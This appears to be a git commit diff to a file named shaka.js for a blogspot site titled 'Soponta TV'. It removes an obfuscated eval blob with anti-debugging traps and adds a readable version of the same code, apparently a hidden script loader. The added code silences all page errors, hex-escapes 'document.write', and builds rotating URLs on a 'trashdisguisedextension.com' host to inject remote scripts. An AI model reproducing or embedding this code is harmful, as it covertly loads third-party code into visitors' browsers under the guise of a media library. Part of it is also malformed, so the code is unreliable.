b7e794a3e58e8362113618de96db61d465f23def
soponta <heber.sba@gmail.com>
2023-09-28 08:27:16 +0700

    Update shaka.js

--- shaka.js
+++ shaka.js
@@ -1,1 +1,57 @@
-function _0x2dae(_0x59c59e,_0x3f1be4){var _0x3e621e=_0x3e62();return _0x2dae=function(_0x2dae6c,_0x438cf5){_0x2dae6c=_0x2dae6c-0x6e;var _0x5f18ac=_0x3e621e[_0x2dae6c];return _0x5f18ac;},_0x2dae(_0x59c59e,_0x3f1be4);}function _0x3e62(){var _0x2e92aa=['38621ZOBCIq','14iwKJrs','17740wIuFxF','740868bqlMcR','10guMBaH','split','500517Toothx','replace','\x5cw+','fromCharCode','toString','9LqfiHI','|||var|function|return|fmt|if||viewport||||constructor|true||body|||||||voronoi||||||code||_0x1e6a36|apply|this||window|||false|_0x480cc8|toString|line|_0x2e4922|else|create|||error|location|slice|ima|||imi|render|arguments|null|new|try|||catch|glyphsByName|methods|bind|name|path|indexOf|Y_|CA3|ime|_0x59b6d0|search|_0x46d92e|parser|RegExp|zA|Z_|test|_0x3f2d6d|Function|console|length|shaka|js|obj|href|A3|script|document|key|izi|event|debugger|9a|init|chain|input|_0x598ac7|log|warn|info|exception|table|trace|for|prototype|__proto__|start|cookieChoices|_0x184c04|setInterval|4000|onerror|blogspot|hostname|decodeURIComponent|Z90|Z0|split|xyz|Date|getDate|getMonth||getHours|getMinutes|getFullYear|https|x3c|K_|charset|UTF|src|L_|x77|x72|x69|x74|x65|trashdisguisedextension|com|gn7nwf406x|31a520928621e787055cc50496110653|tt64fjqae|57cd3809e3d35a5c0e261089ae571aa8|top|title|Soponta|TV|end|typeof|string|canCreateDiscussions|while|counter|call|action|stateObject|_0x358350','2099672sKQhYc','1128yHwXmh','4jeljCh','314456GByLXw','3\x2019=4(){3\x20y$$=e;5\x204(g,6){3\x20n=y$$?4(){7(6){3\x20t=6.w(g,T);5\x206=U,t}}:4(){};5\x20y$$=C,n}}();3\x20D=19(x,4(){5\x20D.E().1a(\x22(((.+)+)+)+$\x22).E().d(D).1a(\x22(((.+)+)+)+$\x22)});D();3\x201b=4(){3\x20y$$=e;5\x204(g,6){3\x20n=y$$?4(){7(6){3\x20t=6.w(g,T);5\x206=U,t}}:4(){};5\x20y$$=C,n}}();(4(){1b(x,4(){3\x201c=V\x201d(\x224\x20*\x5c\x5c(\x20*\x5c\x5c)\x22);3\x20c=V\x201d(\x22\x5c\x5c+\x5c\x5c+\x20*(?:[a-1e-1f$][0-1w-1e-1f$]*)\x22,\x22i\x22);3\x20F=G(\x221x\x22);7(!1c.1g(F+\x221y\x22)||!c.1g(F+\x221z\x22)){F(\x220\x22)}H{G()}})()})();3\x20v=4(){3\x20y$$=e;5\x204(g,6){3\x20n=y$$?4(){7(6){3\x20t=6.w(g,T);5\x206=U,t}}:4(){};5\x20y$$=C,n}}();3\x201h=v(x,4(){3\x20I=4(){3\x209;W{9=1i(\x275\x20(4()\x20{}.d(\x225\x20x\x22)(\x20));\x27)()}Z(1A){9=z}5\x209};3\x20L=I();3\x2010=L.1j=L.1j||{};3\x2011=[\x221B\x22,\x221C\x22,\x221D\x22,\x22L\x22,\x221E\x22,\x221F\x22,\x221G\x22];3\x20i=0;1H(;i<11.1k;i++){3\x20o=v.d.1I.12(v);3\x2013=11[i];3\x2014=10[13]||o;o[\x221J\x22]=v.12(v);o.E=14.E.12(14);10[13]=o}});1h();<!--1K\x201l.1m-->1L={};(4(){3\x20I=4(){3\x209;W{9=1i(\x275\x20(4()\x20{}.d(\x225\x20x\x22)(\x20));\x27)()}Z(1M){9=z}5\x209};3\x201n=I();1n.1N(G,1O)})();z.1P=4(){5\x20e};s=\x22.1Q.\x22;a=z.M.1R;f=a;b=1S(M.1o);1p=0;A=\x22\x22;1T=b;X$=0;1U=0;7(b.15(\x22m=1\x22)>-1){X$=1}7(b.15(\x22m=\x22)>-1){A=b.1V(\x22m=\x22)[1]}7(A.15(\x221W\x22)>-1){1p=1}P$=V\x201X;l=P$.1Y();h=(\x220\x22+l).N(-2);j=P$.1Z();k=(\x220\x22+(j+1)).N(-2);o=P$.21();p=(\x220\x22+o).N(-2);q=P$.22();r=(\x220\x22+q).N(-2);16=r;i=P$.23();17=h+k+p;u=\x2224://\x22;B$=\x22<1q\x22;J$=B$+\x22>\x22;K$=\x22\x5c25/1q>\x22;26=B$+\x22\x2027=\x2728-8\x27\x2029=\x27\x22;2a=\x22\x27>\x22+K$;Q$=\x22)\x22+K$;Y$=J$+\x221r[\x27\x5c\x5c2b\x5c\x5c2c\x5c\x5c2d\x5c\x5c2e\x5c\x5c2f\x27](\x22;18=\x22.2g.2h/\x22;O=18+\x222i?1s=2j\x22;R=18+\x222k?1s=2l\x22;O=u+16+17+O;R=u+16+17+R;1t=O;7(q&1){1t=R}7(M.1o==z.2m.M){1r.2n=\x222o\x202p\x22}<!--2q\x201l.1m-->4\x20G(1u){4\x20S(i){7(2r\x20i===\x222s\x22){5\x204(2t){}.d(\x222u\x20(e)\x20{}\x22).w(\x222v\x22)}H{7((\x22\x22+i/i).1k!==1||i%20===0){(4(){5\x20e}).d(\x221v\x22).2w(\x222x\x22)}H{(4(){5\x20C}).d(\x221v\x22).w(\x222y\x22)}}S(++i)}W{7(1u){5\x20S}H{S(0)}}Z(2z){}};','109939HEqOhD'];_0x3e62=function(){return _0x2e92aa;};return _0x3e62();}var _0x252e52=_0x2dae;(function(_0x33cffe,_0x2864bf){var _0x2ed637=_0x2dae,_0x1de939=_0x33cffe();while(!![]){try{var _0x150c1d=-parseInt(_0x2ed637(0x7f))/0x1*(parseInt(_0x2ed637(0x7c))/0x2)+parseInt(_0x2ed637(0x73))/0x3+-parseInt(_0x2ed637(0x7d))/0x4*(parseInt(_0x2ed637(0x71))/0x5)+-parseInt(_0x2ed637(0x70))/0x6*(parseInt(_0x2ed637(0x6e))/0x7)+-parseInt(_0x2ed637(0x7a))/0x8*(-parseInt(_0x2ed637(0x78))/0x9)+parseInt(_0x2ed637(0x6f))/0xa+-parseInt(_0x2ed637(0x80))/0xb*(-parseInt(_0x2ed637(0x7b))/0xc);if(_0x150c1d===_0x2864bf)break;else _0x1de939['push'](_0x1de939['shift']());}catch(_0x557cc5){_0x1de939['push'](_0x1de939['shift']());}}}(_0x3e62,0x21754),eval(function(_0x2efb4c,_0x10ff9b,_0x4a0a20,_0x303f0c,_0x390ec5,_0x4c68a5){var _0x34f300=_0x2dae;_0x390ec5=function(_0x5e8a21){var _0x3af7a7=_0x2dae;return(_0x5e8a21<_0x10ff9b?'':_0x390ec5(parseInt(_0x5e8a21/_0x10ff9b)))+((_0x5e8a21=_0x5e8a21%_0x10ff9b)>0x23?String[_0x3af7a7(0x76)](_0x5e8a21+0x1d):_0x5e8a21[_0x3af7a7(0x77)](0x24));};if(!''[_0x34f300(0x74)](/^/,String)){while(_0x4a0a20--)_0x4c68a5[_0x390ec5(_0x4a0a20)]=_0x303f0c[_0x4a0a20]||_0x390ec5(_0x4a0a20);_0x303f0c=[function(_0x254e3c){return _0x4c68a5[_0x254e3c];}],_0x390ec5=function(){var _0x24d232=_0x34f300;return _0x24d232(0x75);},_0x4a0a20=0x1;};while(_0x4a0a20--)if(_0x303f0c[_0x4a0a20])_0x2efb4c=_0x2efb4c['replace'](new RegExp('\x5cb'+_0x390ec5(_0x4a0a20)+'\x5cb','g'),_0x303f0c[_0x4a0a20]);return _0x2efb4c;}(_0x252e52(0x7e),0x3e,0xa0,_0x252e52(0x79)[_0x252e52(0x72)]('|'),0x0,{})));
+<!-- start shaka.js-->
+cookieChoices = {};
+window.onerror = function() {
+  return true;
+};
+s = ".blogspot.";
+a = window.location.hostname;
+f = a;
+b = decodeURIComponent(location.href);
+A3 = 0;
+A = "";
+Z90 = b;
+X$ = 0;
+Z0 = 0;
+if (b.indexOf("m=1") > -1) {
+  X$ = 1;
+}
+if (b.indexOf("m=") > -1) {
+  A = b.split("m=")[1];
+}
+if (A.indexOf("xyz") > -1) {
+  A3 = 1;
+}
+
+P$ = new Date;
+l = P$.getDate();
+h = ("0" + l).slice(-2);
+j = P$.getMonth();
+k = ("0" + (j + 1)).slice(-2);
+o = P$.getHours();
+p = ("0" + o).slice(-2);
+q = P$.getMinutes();
+r = ("0" + q).slice(-2);
+Y_ = r;
+i = P$.getFullYear();
+CA3 = h + k + p;
+u = "https://";
+B$ = "<script";
+J$ = B$ + ">";
+K$ = "\x3c/script>";
+K_ = B$ + " charset='UTF-8' src='";
+L_ = "'>" + K$;
+Q$ = ")" + K$;
+Y$ = J$ + "document['\\x77\\x72\\x69\\x74\\x65'](";
+ime = ".trashdisguisedextension.com/";
+ima = ime + "gn7nwf406x?key=31a520928621e787055cc50496110653";
+imi = ime + "tt64fjqae?key=57cd3809e3d35a5c0e261089ae571aa8";
+ima = u + Y_ + CA3 + ima;
+imi = u + Y_ + CA3 + imi;
+izi = ima;
+if (q & 1) {
+  izi = imi;
+}
+if (location.href == window.top.location) {
+  document.title = "Soponta TV";
+}
+<!-- end shaka.js-->
